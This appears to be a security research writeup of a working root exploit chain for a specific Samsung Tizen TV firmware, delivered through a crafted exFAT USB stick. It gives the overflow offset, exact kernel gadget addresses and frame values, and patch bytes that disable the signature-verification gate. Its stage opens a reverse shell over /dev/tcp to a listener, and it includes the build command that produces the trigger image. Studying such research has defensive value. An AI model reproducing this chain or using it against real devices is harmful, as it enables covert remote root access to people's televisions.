# Kant-M2 (T-KTM2DEUC 1400.2) exFAT chain — static evidence

Status: firmware-artifact analysis. Runtime root was subsequently observed on
one device; see ../../docs/USB-STICK.md for the separate evidence and limits.

Target: Samsung QE49Q6FNA, Tizen 4.0, `T-KTM2DEUC-1400.2`, platform
`18_KANTM2_QTV`.

## 1. Provenance

| Item | Value |
|---|---|
| Firmware archive | `T-KTM2DEUC.zip` (1,375,406,746 bytes) |
| Archive SHA-256 | `0f30e46098495e88f809b637b977c7f3da55ae1603f3ce71d10bf057ace2ada4` |
| URL | `https://org.downloadcenter.samsung.com/content/FM/202607/20260729103150980/T-KTM2DEUC.zip` |
| `upgrade.msd` SHA-256 | `d913f5fc7e975dd0e7a3d05876886b57b803db08bad75872a780ce9bcfaae435` |
| `info.txt` | version 1400.2, build 2026-06-05, key `2018_KANTM2_(A)/(R)`, MD5 `13503c84adbb340c997730bba3e4f560` |
| Decrypted `uImage` SHA-256 | `5a9f1c491e0125836a3c75fec0f56b3064563316b06c0e0ecb6f073a185021f5` |
| Extracted `kernel.bin` SHA-256 | `3e370858c18794d262a0595bc10fc4af47a2a036473f2855493e508e9dd17567` |
| Kernel load base | `0xc0008000` |
| `exfat_core.ko` SHA-256 | `22f43de04d7ee4ff4183e99474e4b3c0a02a3690f1aa0636961daceebfe602cf` |
| `exfat_fs.ko` SHA-256 | `e86e85c54e7b8feeb1f8bc56ca3ef877bb9bac09da65d8a3b020d76f964f5a90` |

`exfat_core.ko` is byte-identical to the artifact published by the upstream
research for this firmware family. The address table below was re-derived from
this `kernel.bin`, not copied from another profile.

**Not established:** that the firmware installed on this specific TV is
byte-identical to this archive. The version string matches and the chain ran
on the device, but no device dump exists. The addresses are verified against
this firmware artifact and were exercised on the TV.

## 2. Vulnerability geometry (verified on the module)

The bug is the upstream exFAT `num_ext` name-fragment overflow. It is present
unchanged in the Kant modules.

`ffsReadDir` in `exfat_core.ko` at `0x260c` (size `0x4cc`):

| Fact | Evidence |
|---|---|
| Frame | `mov ip,sp`; `push {r4-r8,sb,sl,fp,ip,lr,pc}`; `sub fp,ip,#4`; `sub sp,sp,#0x264` |
| Name buffer | `uniname = fp - 0x230` = `fp - 560`; used at five sites in `ffsReadDir` |
| Single epilogue | `0x2648`: `sub sp,fp,#0x28`; `ldm sp,{r4,r5,r6,r7,r8,sb,sl,fp,sp,pc}` |
| Saved slots | `fp-0x28 .. fp-4` = `uniname+520 .. uniname+556` |
| Source pointer left in `ip` | `0x2a10`: `add ip,r8,#0x310`; `0x2a30`: `b 0x2648` (ip not clobbered) |

Only three branches reach the epilogue: `0x2718`, `0x2a30`, `0x2aac`.

Caller chain, each frame recovered instruction-by-instruction:

```
exfat_iterate   exfat_fs.ko 0x2dc
    sub sp,sp,#0x36c                 @ 0x2e8
    r1 = fp - 0x36c                  @ 0x37c
    bl FsReadDir                     @ 0x38c
  -> FsReadDir  exfat_core.ko 0x7384 (size 0x74)
    push {r4,r5,r6,r7,fp,ip,lr,pc}   @ 0x7388   (8 registers)
    fp = ip - 4                      @ 0x738c
    bl ffsReadDir                    @ 0x73d0
      -> ffsReadDir 0x260c
```

Frame arithmetic:

```
fp_I = SP_entry - 4
fp_F = fp_I - 0x398
fp_S = fp_F - 0x20
uniname = fp_S - 0x230 = fp_I - 0x5e8
ip      = r8 + 0x310   = fp_I - 0x5c      (r8 = r1 = fp_I - 0x36c)
ip - uniname = 0x58c = 1420
```

The injection offset **1420** is therefore derived from this module's frames,
not copied from the T-MSM profile.

A `strd r0,r1,[ip,#-8]` at `0x2a14` writes 8 bytes at stream offset 1416..1423,
i.e. at `uniname+0x584`, immediately *before* the injected blob. The builder
keeps pattern data there; the blob may not start earlier than 1420.

## 3. Kernel chain (verified on `kernel.bin`)

All addresses re-derived from this image; exported symbols cross-checked with
`__ksymtab`.

| Role | Address | Instruction evidence |
|---|---|---|
| `ldm ip` control frame | `0xc04dde3c` | `9ce79ce8` = `ldm ip,{r2,r3,r4,r7,r8,sb,sl,sp,lr,pc}` |
| copy window entry | `0xc010598c` | `mov r2,r4; mov r1,ip; mov r0,r6; blx r3` |
| copy window exit | `0xc0105778` | `sub sp,fp,#0x28; ldm sp,{r4,r5,r6,r7,r8,sb,sl,fp,sp,pc}` |
| `memcpy` | `0xc01fa720` | `push {r0,r4,lr}`; restores only `r0,r4,pc`, so `r1` stays advanced |
| save-`r1` gadget | `0xc00a5c44` | `str r1,[r4]; sub sp,fp,#0x1c; ldm ...` |
| flush wrapper | `0xc0012954` | `add r1,r4,#0x1c; mov r0,r4; bl coherent; ...` |
| `v7_coherent_kern_range` | `0xc001cba8` | exported symbol |
| `call_usermodehelper` | `0xc0039a78` | exported symbol |
| `schedule_timeout_uninterruptible` | `0xc04cc05c` | exported symbol |
| UEP gate | `0xc01cdecc` | `SfdUepVerifyFileSignature`, unique prologue |

The gadget at `0xc04dde3c` is inside a literal pool (its neighbours decode as
nonsense), so it is only reachable as a jump target, which is exactly how the
frame uses it.

### Writable-cave indicator

The cave `0xc0008358..0xc0009000` is a zero hole immediately after a function
that ends in `bx r0` at `0xc0008354`:

* 200 bytes checked zero at `0xc0008358..0xc0008420`;
* zero direct branches and zero literal pointers into the hole;
* the kernel contains none of `Write protecting the kernel read-only data`,
  `Freeing unused kernel memory`, `rodata=`, `CONFIG_STRICT_KERNEL_RWX`;
  `__ksymtab` has no `set_memory_ro` / `mark_rodata_ro`.

This is a strong static indicator that kernel text stays writable, but it is
**not** a runtime proof. If strict RWX were active, the first `memcpy` into the
cave would fault and the TV would oops/panic at mount time.

## 4. Payload design

Two variants are built from the same chain.

```
CAVE        0xc0008400   copy-window exit frame (stream +40)
DEST        0xc00083d8   memcpy destination (CAVE-40)
STORE_FRAME 0xc0008428   save-r1 epilogue frame (stream +80)
STAGE0      0xc0008444   28-byte coherent-flush stub (stream +108)
FLUSH_FRAME 0xc000845c   flush-wrapper epilogue frame (stream +132)
FULL        0xc0008470   stage (stream +152)
SAVE_IP     0xc0008d00   save-r1 stores the advanced source pointer
FAKE_SP     0xc0008e00   scratch stack for memcpy and the flush stubs
```

Kant differs from the published T-MSM profile in two gadgets:

* save gadget stores at `[r4]` (no `+0x18`), so frame 1 sets `r4 = SAVE_IP`;
* flush wrapper is `0xc0012954`.

`memcpy` copies exactly the injected blob length (`copy_len = 152 + payload`),
because the blob is padded to `copy_len`. The advanced `r1` is stored at
`SAVE_IP`; the stage reloads it as its stack (`sp = saved_r1 - 256`), so the
stage never depends on a per-boot kernel stack address.

### Stages

Two stage families are built from the same chain.

`proof` (historical): sets up a one-element `argv`, calls
`call_usermodehelper("/bin/bash", argv, envp, UMH_NO_WAIT)` and then parks the
calling thread in `schedule_timeout_uninterruptible` so the corrupted frame is
not resumed. The bash command uses builtins only, writes `ROOT_PROOF.txt` with
`PID`, mount point, `EUID`, the `Uid:` line of `/proc/self/status` and the
mount table, retries up to 6 times, then exits.

`umh` / `umh-boot` (current): the same helper call runs a bash command that
writes `KANT-UMH-A` and `KANT-UMH-B` markers with `/usr/bin/dd`, then opens
`/dev/tcp/HOST/4445` and execs `/bin/bash -i`. The boot variant first waits up
to 300 s for the listener on port 4444, because the shell connects only once
per cold boot. `umh-boot` writes no kernel text; `umh` patches the UEP gate
first.

The retry and wait cover storaged still mounting p1/p2 when the trigger fires.
No mount path is hardcoded, so the unverified `/opt/media/USBDriveA1/A2` naming
is not a dependency.

### UEP variants

| Variant | UEP gate | Assumption |
|---|---|---|
| unpatched (`umh-boot`, `umh-nopatch`) | untouched | stock `/bin/bash` is signed and passes UEP |
| patched (`umh`) | patched in RAM | any executable runs, signed or not |

UEP patch bytes at `0xc01cdecc`: `02 00 a0 e3 1e ff 2f e1`
(`mov r0,#2; bx lr`), followed by `v7_coherent_kern_range` on the 8 bytes.

The exec path was confirmed: `SfdUepVerifyExecutableBinary` calls
`0xc01cdecc` at `0xc01ceb88` and `0xc01cebe4`, so one patch covers both call
sites. Return value `2` is an existing return path of the same function
(`0xc01cdfc4`, `mov r4,#2`), and the exec wrapper stores it in its result
struct; the consumer of that stored value was not traced. Upstream's published
UEP bypass uses the same value. The patch is RAM-only and disappears on
power-off.

Stock `/bin/bash` is signed (it ships in the signed rootfs), so the unpatched
stage is the smaller change. It is the configuration used in the validated
run. The `umh` variant is the fallback if bash is blocked on another image.

## 5. Local verification

Rebuild the validated image with the public tools:

```sh
python tools/build.py --variant umh-boot --beacon LISTENER_IP:4444
```

With the listener address used for the hardware run, this reproduces
`stage_kant_umh_boot.bin`, `cave_kant_umh_boot.bin` and
`p1_kant_umh_boot.img` byte-for-byte. The table below also records the earlier
proof-file variants from the same research tree; `tools/build.py` exposes them
as `proof` and `proof-uep`.

Per-variant pipeline: stage (`clang -target armv7-none-eabi`) → cave blob →
8 MiB exFAT trigger (`num_ext` computed from blob length) → 80 MiB
two-partition USB image. The independent verifier parses the exFAT boot sector
and FAT chain from scratch, reconstructs the 30-byte name stream and checks the
frame words and blob bytes.

| Check | Result |
|---|---|
| Stage zero halfwords | none (all variants) |
| Blob zero halfwords | only offset `0xa`, high half of `r4=copy_len`; terminates disposable `r7/r8`, resumes at `+20` |
| Frame writes | `r6@528=0xc00083d8`, `fp@548=0xc0008428`, `sp@552=0xc0008e00`, `pc@556=0xc04dde3c` — PASS |
| Blob at stream 1420 | byte-identical — PASS |
| exFAT boot checksum | `0xf1a0b24d`, stored and repeated; backup boot identical |
| `fsck_exfat` (block device) | volume `TRIG`; main/alternate boot regions valid; only the intended crafted file set is flagged |
| `fsck_msdos` on p2 | clean FAT32 |
| macOS partition view | MBR, p1 type `0x07`, p2 type `0x0C` |

These checks prove the on-disk bytes and the intended register/frame values.
They do not prove the kernel executes the chain.

## 6. Artifacts

`out/manifest.json` in the research tree recorded the following artifacts.
The public builders write the same files under `out/<variant>/` with generic
names.

| Variant | Stage | Cave blob | `num_ext` | Trigger p1 | USB image |
|---|---|---|---:|---|---|
| `umh-boot` | `stage_kant_umh_boot.bin` 1080 B<br>`a7ba9371…` | `cave_kant_umh_boot.bin` 1232 B<br>`35b72e3b…` | 86 | `p1_kant_umh_boot.img`<br>`c19e2e0d…` | `usb_kant_umh_boot.img` 80 MiB<br>`876d6493…` |
| `proof` | `stage_kant.bin` 584 B<br>`e9d6333d…` | `cave_kant.bin` 736 B<br>`221adc51…` | 73 | `p1_kant.img`<br>`664ad350…` | `usb_kant.img` 80 MiB<br>`2731606b…` |
| `proof-uep` | `stage_kant_uep.bin` 628 B<br>`b827e491…` | `cave_kant_uep.bin` 780 B<br>`135e00dc…` | 75 | `p1_kant_uep.img`<br>`0307bfad…` | `usb_kant_uep.img` 80 MiB<br>`e3a90a52…` |

The research p2 (`p2_fat32.img`, 64 MiB, `f29c473f…`) was built separately.
The public generator produces a different but valid deterministic FAT32 volume
of the same size. The USB image hash therefore differs while the stage, cave
and p1 hashes match.

Layout of each USB image: MBR at LBA 0; p1 at LBA 2048 (type `0x07`, 16384
sectors); p2 at LBA 18432 (type `0x0C`, 131072 sectors).

## 7. What is NOT verified

* Byte-identity of the firmware installed on this specific TV with the
  downloaded archive. The version string matches, but no device dump exists.
* Whether the UEP-patched `umh` variant works as intended. The validated run
  used the unpatched boot stage.
* Whether p2 is mounted when the trigger fires, and whether the proof write
  lands on p2 rather than another mounted volume.
* The consumer of the UEP wrapper's stored result value `2`.
* USB read/write policy, fsck-on-mount, watchdog and panic behaviour.
* Kernel oops/reboot behaviour when the chain is wrong. Leaving the stick
  inserted across several boots produced a reboot loop on the validated unit.
* Addresses for other Kant-M2 firmware images. They must be re-derived unless
  the kernel is identical.
* Long-running stability and root persistence across a restart without the
  stick.

